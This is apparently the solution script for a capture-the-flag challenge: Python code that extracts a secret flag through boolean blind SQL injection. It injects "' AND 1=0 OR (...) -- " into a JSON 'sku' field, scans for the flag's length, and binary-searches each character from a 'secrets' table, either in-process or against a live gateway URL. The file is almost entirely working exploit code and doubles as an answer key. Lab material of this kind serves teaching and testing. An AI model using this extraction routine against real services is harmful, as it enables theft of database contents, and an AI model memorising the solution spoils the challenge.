"""Deterministic blind extraction used as executable solution evidence.

Runs against the in-process oracle by default and against the live gateway
with ``--url ROOT``. Extraction is a length scan followed by a binary search
per character over the flag charset, one boolean query per comparison.
"""
import json
import re
import sys
import urllib.error
import urllib.request

from challenge import FLAG, oracle

CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
assert CHARSET == "".join(sorted(CHARSET)), "charset must be ascending"
FLAG_RE = re.compile(r"T3MP3ST\{[a-zA-Z0-9_]+\}")


def _probe_expr(predicate: str) -> str:
    return f"' AND 1=0 OR ({predicate}) -- "


def make_probe(url_root: str | None):
    if url_root is None:
        def offline(predicate: str) -> bool:
            found, _count = oracle(_probe_expr(predicate))
            return found

        return offline

    def live(predicate: str) -> bool:
        body = json.dumps({"sku": _probe_expr(predicate)}).encode()
        request = urllib.request.Request(
            url_root.rstrip("/") + "/query",
            data=body,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(request, timeout=5) as response:
                return response.status == 200
        except urllib.error.HTTPError as error:
            return error.status == 200
        except urllib.error.URLError:
            raise SystemExit("gateway unreachable")

    return live


def extract(probe) -> str:
    length = 0
    for candidate in range(1, 65):
        if probe(f"(SELECT length(value) FROM secrets WHERE name='flag') >= {candidate}"):
            length = candidate
        else:
            break
    if length == 0:
        raise ValueError("flag column not locatable")

    extracted = ""
    for index in range(1, length + 1):
        low, high = 0, len(CHARSET) - 1
        chosen = ""
        column = f"(SELECT substr(value, {index}, 1) FROM secrets WHERE name='flag')"
        while low <= high:
            mid = (low + high) // 2
            if probe(f"{column} >= '{CHARSET[mid]}'"):
                chosen = CHARSET[mid]
                low = mid + 1
            else:
                high = mid - 1
        if not probe(f"{column} = '{chosen}'"):
            raise ValueError("character verification failed")
        extracted += chosen
    if not FLAG_RE.fullmatch(extracted):
        raise ValueError("extracted value is not a valid flag")
    return extracted


if __name__ == "__main__":
    url_root: str | None = None
    args = iter(sys.argv[1:])
    for arg in args:
        if arg == "--url":
            url_root = next(args)
        elif arg.startswith("--url="):
            url_root = arg.split("=", 1)[1]
        else:
            raise SystemExit(f"unknown argument: {arg}")
    result = extract(make_probe(url_root))
    assert result == FLAG, "extracted flag does not match the committed lab constant"
    print(result)
